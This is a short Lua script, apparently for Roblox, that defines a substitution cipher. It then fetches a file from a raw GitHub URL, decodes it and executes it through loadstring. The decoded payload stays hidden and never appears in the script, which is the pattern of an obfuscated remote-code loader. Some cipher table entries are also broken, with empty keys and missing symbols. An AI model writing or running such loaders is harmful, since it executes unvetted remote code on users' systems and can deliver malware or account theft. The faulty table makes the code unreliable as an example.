local ct = {
["a"] = "x", ["b"] = "s", ["c"] = "n", ["d"] = "p", ["e"] = "r",
["f"] = "c", ["g"] = "h", ["h"] = "u", ["i"] = "t", ["j"] = "q",
["k"] = "o", ["l"] = "v", ["m"] = "y", ["n"] = "w", ["o"] = "z",
["p"] = "m", ["q"] = "i", ["r"] = "j", ["s"] = "k", ["t"] = "d",
["u"] = "a", ["v"] = "f", ["w"] = "e", ["x"] = "g", ["y"] = "b",
["z"] = "l", ["A"] = "E", ["B"] = "R", ["C"] = "G", ["D"] = "V",
["E"] = "P", ["F"] = "S", ["G"] = "J", ["H"] = "W", ["I"] = "Z",
["J"] = "O", ["K"] = "T", ["L"] = "U", ["M"] = "X", ["N"] = "Y",
["O"] = "C", ["P"] = "Q", ["Q"] = "F", ["R"] = "H", ["S"] = "K",
["T"] = "L", ["U"] = "N", ["V"] = "M", ["W"] = "I", ["X"] = "B",
["Y"] = "D", ["Z"] = "A", ["0"] = "3", ["1"] = "7", ["2"] = "1",
["3"] = "5", ["4"] = "9", ["5"] = "2", ["6"] = "8", ["7"] = "0",
["8"] = "4", ["9"] = "6", ["!"] = "?", ["@"] = "#", ["#"] = "$",
["$"] = "%", ["%"] = "&", ["^"] = "", ["&"] = "(", [""] = ")",
["("] = "-", [")"] = "+", [""] = "=", ["+"] = "", ["{"] = "[",
["}"] = "]", ["["] = "{", ["]"] = "}", ["\\"] = "|", ["|"] = "\\",
[";"] = ":", [":"] = ";", ['"'] = "'", ["'"] = '"', [","] = ".",
["."] = ",", ["/"] = "<", ["<"] = ">", [">"] = "/", ["?"] = "!",
[" "] = " ", ["\n"] = "\n", ["\t"] = "\t", ["~"] = "`", ["`"] = "~"
}
function e(m)
l,c="",{}
for i=1,#m do
char=string.sub(m,i,i)
if(ct[char])then
c[i]=ct[char] else c[i]=char end
end
for j=1,#c do
l=l..c[j]
end
return l
end

function d(c)
l,d="",{}
for i=1,#c do
char=string.sub(c,i,i)
for j,k in pairs(ct)do
if(k==char)then d[i]=j;break end
end
end
for i=1,#d do
l=l..d[i]
end
return l
end

local code = game:HttpGet("https://raw.githubusercontent.com/NewGuy103/bookish-pancake/main/init.txt")

local msg1 = d(code)
loadstring(msg1)()
